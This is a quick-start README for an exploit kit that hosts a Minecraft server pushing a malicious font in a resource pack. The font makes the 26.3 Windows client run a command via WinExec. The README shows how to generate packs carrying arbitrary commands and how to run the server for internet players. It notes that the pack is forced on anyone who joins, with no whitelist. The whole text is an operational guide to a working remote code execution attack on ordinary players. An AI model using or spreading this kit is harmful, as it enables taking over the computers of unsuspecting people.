# minecraft2shell — quick start

The server hands out a resource pack with a malicious font; a Minecraft 26.3 client (Windows) runs a command via `WinExec` when it loads the pack. The original pack launches `calc.exe`; the generator lets you put in any command.

## 1. Generate a pack with an arbitrary command

```bash
python gen_payload.py --cmd "start notepad"
```

The command is wrapped in `cmd /c ...` automatically; use `--raw` to pass the string verbatim. Output: `resource-pack-cmd.zip` plus the new SHA-1 (printed and self-checked).

## 2. Run

Server only (waits for any players, pack is forced on everyone):

```bash
python poc_server.py --rounds 0            # endless F/A loop
python poc_server.py --rounds 0 --host <public IP/domain>   # for internet players
```

With a local target client (the stock Mojang 26.3 client starts by itself):

```bash
python poc.py --rounds 2
```

## Notes

- The script downloads all official dependencies (26.3 client/server, Java) into `dependencies/` takes about 10 minutes.
- `online-mode=false`, no whitelist — any nickname can join.
- `require-resource-pack=true` — a player cannot join before accepting the pack, so the fonts are always loaded before the glyph broadcast.
- The exploit only fires on the **26.3** client (FreeType 2.14.3 x64); other versions just see odd glyphs.
- Internet play: forward **25565** (game) and **8766** (HTTP pack), allow them in the firewall, and pass `--host <public IP/domain>` — otherwise the pack cannot be downloaded and the player gets kicked.
- Output: `runs/<timestamp>/result.json`, phase logs in `runs/.../phase-*.log`.

## Files

| file | purpose |
|---|---|
| `gen_payload.py` | generator: `--cmd "..."` → patched pack + SHA-1 |
| `poc.py` | server + local client + glyph broadcast |
| `poc_server.py` | server only, no client (`--rounds 0` = loop) |
| `ttdis.py` | TrueType bytecode disassembler (payload audit) |
| `verify_pack.py` | byte-level verification of the generated pack |
